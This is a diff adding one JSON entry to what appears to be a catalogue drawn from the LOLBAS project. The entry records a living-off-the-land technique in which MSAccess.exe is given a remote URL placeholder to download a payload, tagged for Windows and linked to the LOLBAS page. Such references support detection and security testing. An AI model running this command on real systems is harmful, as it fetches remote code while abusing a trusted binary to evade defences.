@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-msaccess-exe-download",
+  "name": "LOLBAS · MSAccess.exe (Download)",
+  "command": "MSAccess.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "msaccess",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/MSAccess/",
+  "upstream_id": "MSAccess.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — MSAccess.exe",
+      "url": "https://lolbas-project.github.io/lolbas/MSAccess/"
+    }
+  ]
+}
